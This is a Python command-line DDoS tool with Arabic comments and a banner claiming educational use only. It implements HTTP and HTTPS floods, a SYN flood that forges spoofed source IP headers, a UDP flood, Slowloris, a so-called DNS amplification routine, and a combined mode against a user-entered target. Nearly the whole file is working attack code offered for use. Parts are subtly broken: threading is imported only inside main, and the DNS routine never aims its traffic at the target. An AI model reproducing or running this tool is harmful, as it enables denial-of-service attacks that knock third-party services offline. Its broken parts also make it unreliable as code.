#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# أداة DDoS بواسطة a3t8al - للإستخدام التعليمي فقط

import asyncio
import aiohttp
import socket
import random
import struct
import time
import ssl
import requests
import platform
import argparse
import sys
from datetime import datetime

class TerminalDDoSTool:
    def __init__(self):
        self.total_attacks = 0
        self.successful_attacks = 0
        self.attack_running = True
        self.user_agents = self._load_user_agents()
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    def _load_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)',
            'Mozilla/5.0 (Linux; Android 11; SM-G998B)',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)'
        ]

    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════════╗
║              أداة DDoS - a3t8al              ║
║         للإستخدام التعليمي فقط              ║
╚═══════════════════════════════════════════════╝
        """
        print(banner)

    def print_system_info(self):
        """عرض معلومات النظام والشبكة"""
        print("\n[📡] جمع معلومات النظام...")
        
        # معلومات النظام
        sys_info = {
            "النظام": platform.system(),
            "اسم الجهاز": platform.node(),
            "الإصدار": platform.release(),
            "المعالج": platform.machine(),
            "بايثون": platform.python_version()
        }
        
        print("\n[🖥️] معلومات النظام:")
        for key, value in sys_info.items():
            print(f"   {key}: {value}")
        
        # معلومات الشبكة
        try:
            response = requests.get('http://ip-api.com/json/', timeout=10)
            data = response.json()
            ip_info = {
                "IP": data.get("query", "غير معروف"),
                "البلد": data.get("country", "غير معروف"),
                "المزود": data.get("isp", "غير معروف")
            }
            
            print("\n[🌐] معلومات الشبكة:")
            for key, value in ip_info.items():
                print(f"   {key}: {value}")
                
        except Exception as e:
            print(f"   [!] خطأ في جمع معلومات الشبكة: {e}")

    def print_attack_types(self):
        """عرض أنواع الهجمات المتاحة"""
        print("\n[⚡] أنواع الهجمات المتاحة:")
        attacks = {
            "1": "HTTP Flood",
            "2": "HTTPS Flood", 
            "3": "SYN Flood",
            "4": "UDP Flood",
            "5": "Slowloris",
            "6": "DNS Amplification",
            "7": "هجوم شامل (جميع الأنواع)"
        }
        
        for key, value in attacks.items():
            print(f"   {key}. {value}")

    async def http_flood(self, target, duration, threads=100):
        """هجوم HTTP Flood"""
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target

        print(f"[🌊] بدء HTTP Flood على {target}")
        
        async def attack_task(task_id):
            end_time = time.time() + duration
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                while time.time() < end_time and self.attack_running:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': '*/*',
                            'Connection': 'keep-alive'
                        }
                        async with session.get(target, headers=headers, timeout=5) as resp:
                            if resp.status < 500:
                                self.successful_attacks += 1
                        self.total_attacks += 1
                    except:
                        pass

        tasks = [attack_task(i) for i in range(threads)]
        await asyncio.gather(*tasks)

    async def https_flood(self, target, duration, threads=100):
        """هجوم HTTPS Flood"""
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target

        print(f"[🔒] بدء HTTPS Flood على {target}")
        
        async def attack_task(task_id):
            end_time = time.time() + duration
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=self.ssl_context)) as session:
                while time.time() < end_time and self.attack_running:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': '*/*',
                            'Connection': 'keep-alive'
                        }
                        async with session.get(target, headers=headers, timeout=5) as resp:
                            if resp.status < 500:
                                self.successful_attacks += 1
                        self.total_attacks += 1
                    except:
                        pass

        tasks = [attack_task(i) for i in range(threads)]
        await asyncio.gather(*tasks)

    def syn_flood(self, target_ip, target_port, duration, threads=50):
        """هجوم SYN Flood"""
        print(f"[🎯] بدء SYN Flood على {target_ip}:{target_port}")
        
        def attack_thread(thread_id):
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    
                    source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    source_port = random.randint(1024, 65535)
                    
                    ip_header = self._craft_ip_header(source_ip, target_ip)
                    tcp_header = self._craft_tcp_header(source_port, target_port)
                    
                    s.sendto(ip_header + tcp_header, (target_ip, target_port))
                    self.successful_attacks += 1
                    s.close()
                except Exception as e:
                    pass
                finally:
                    self.total_attacks += 1

        for i in range(threads):
            threading.Thread(target=attack_thread, args=(i,), daemon=True).start()

    def udp_flood(self, target_ip, target_port, duration, threads=50, packet_size=1024):
        """هجوم UDP Flood"""
        print(f"[💥] بدء UDP Flood على {target_ip}:{target_port}")
        
        def attack_thread(thread_id):
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    bytes_data = random._urandom(packet_size)
                    s.sendto(bytes_data, (target_ip, target_port))
                    self.successful_attacks += 1
                    s.close()
                except:
                    pass
                finally:
                    self.total_attacks += 1

        for i in range(threads):
            threading.Thread(target=attack_thread, args=(i,), daemon=True).start()

    async def slowloris(self, target, sockets_count=200, duration=30, threads=1):
        """هجوم Slowloris"""
        if ':' in target:
            target, port = target.split(':')
            port = int(port)
        else:
            port = 80

        print(f"[🐌] بدء Slowloris على {target}:{port}")
        
        async def attack_task(task_id):
            sockets = []
            end_time = time.time() + duration
            
            # إنشاء اتصالات
            for _ in range(sockets_count):
                if not self.attack_running or time.time() > end_time:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                    sockets.append(s)
                    self.successful_attacks += 1
                except:
                    pass
                finally:
                    self.total_attacks += 1
            
            # الحفاظ على الاتصالات
            while time.time() < end_time and self.attack_running:
                for s in sockets[:]:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        await asyncio.sleep(15)
                    except:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
            
            # تنظيف
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

        tasks = [attack_task(i) for i in range(threads)]
        await asyncio.gather(*tasks)

    def dns_amplification(self, target_ip, duration, threads=10):
        """هجوم تضخيم DNS"""
        print(f"[📡] بدء DNS Amplification على {target_ip}")
        
        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        dns_query = bytes.fromhex('AA AA 01 00 00 01 00 00 00 00 00 00 07 69 73 63 03 6f 72 67 00 00 FF 00 01')

        def attack_thread(thread_id):
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    dns_server = random.choice(dns_servers)
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(dns_query, (dns_server, 53))
                    s.close()
                    self.successful_attacks += 1
                except:
                    pass
                finally:
                    self.total_attacks += 1

        for i in range(threads):
            threading.Thread(target=attack_thread, args=(i,), daemon=True).start()

    def _craft_ip_header(self, source_ip, dest_ip):
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        return struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
            ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr
        )

    def _craft_tcp_header(self, source_port, dest_port):
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0x02
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        
        return struct.pack('!HHLLBBHHH',
            source_port, dest_port, tcp_seq,
            tcp_ack_seq, tcp_offset_res, tcp_flags,
            tcp_window, tcp_check, tcp_urg_ptr
        )

    def stop_attacks(self):
        """إيقاف جميع الهجمات"""
        self.attack_running = False
        print("\n[🛑] تم إيقاف الهجمات")

    def print_stats(self):
        """عرض الإحصائيات"""
        success_rate = (self.successful_attacks / self.total_attacks * 100) if self.total_attacks > 0 else 0
        print(f"\n[📊] الإحصائيات:")
        print(f"   إجمالي الطلبات: {self.total_attacks}")
        print(f"   الطلبات الناجحة: {self.successful_attacks}")
        print(f"   معدل النجاح: {success_rate:.2f}%")

    async def run_attack(self, attack_type, target, port=80, duration=60, threads=100):
        """تشغيل الهجوم المحدد"""
        self.total_attacks = 0
        self.successful_attacks = 0
        self.attack_running = True
        
        start_time = time.time()
        
        try:
            if attack_type == "1":  # HTTP Flood
                await self.http_flood(target, duration, threads)
            elif attack_type == "2":  # HTTPS Flood
                await self.https_flood(target, duration, threads)
            elif attack_type == "3":  # SYN Flood
                self.syn_flood(target, port, duration, threads)
                await asyncio.sleep(duration)
            elif attack_type == "4":  # UDP Flood
                self.udp_flood(target, port, duration, threads)
                await asyncio.sleep(duration)
            elif attack_type == "5":  # Slowloris
                await self.slowloris(f"{target}:{port}", 200, duration, threads)
            elif attack_type == "6":  # DNS Amplification
                self.dns_amplification(target, duration, threads)
                await asyncio.sleep(duration)
            elif attack_type == "7":  # هجوم شامل
                await asyncio.gather(
                    self.http_flood(target, duration, threads//4),
                    self.https_flood(target, duration, threads//4),
                    asyncio.to_thread(self.syn_flood, target, port, duration, threads//4),
                    asyncio.to_thread(self.udp_flood, target, port, duration, threads//4)
                )
                
        except KeyboardInterrupt:
            self.stop_attacks()
        except Exception as e:
            print(f"[❌] خطأ: {e}")
        
        end_time = time.time()
        print(f"\n[⏱️] مدة الهجوم: {end_time - start_time:.2f} ثانية")
        self.print_stats()

def main():
    import threading  # أضف هذا الاستيراد هنا
    
    parser = argparse.ArgumentParser(description='أداة DDoS بواسطة a3t8al - للإستخدام التعليمي')
    parser.add_argument('-t', '--target', help='الهدف (IP أو URL)')
    parser.add_argument('-p', '--port', type=int, default=80, help='المنفذ (افتراضي: 80)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='المدة بالثواني (افتراضي: 60)')
    parser.add_argument('-th', '--threads', type=int, default=100, help='عدد الثريدات (افتراضي: 100)')
    parser.add_argument('-a', '--attack', help='نوع الهجوم (1-7)')
    
    args = parser.parse_args()
    
    tool = TerminalDDoSTool()
    tool.print_banner()
    tool.print_system_info()
    
    if not args.target:
        tool.print_attack_types()
        target = input("\n[🎯] أدخل الهدف (IP/URL): ").strip()
        port = int(input("[🔌] أدخل المنفذ (افتراضي 80): ") or "80")
        duration = int(input("[⏱️] أدخل المدة بالثواني (افتراضي 60): ") or "60")
        threads = int(input("[🧵] أدخل عدد الثريدات (افتراضي 100): ") or "100")
        attack_type = input("[⚡] اختر نوع الهجوم (1-7): ").strip()
    else:
        target = args.target
        port = args.port
        duration = args.duration
        threads = args.threads
        attack_type = args.attack or input("[⚡] اختر نوع الهجوم (1-7): ").strip()
    
    if not target:
        print("[❌] يجب تحديد هدف!")
        return
    
    print(f"\n[🚀] بدء الهجوم على {target}:{port}")
    print(f"[📋] الإعدادات: {duration} ثانية, {threads} ثريد")
    
    try:
        asyncio.run(tool.run_attack(attack_type, target, port, duration, threads))
    except KeyboardInterrupt:
        tool.stop_attacks()
    except Exception as e:
        print(f"[❌] خطأ: {e}")

if __name__ == "__main__":
    main()
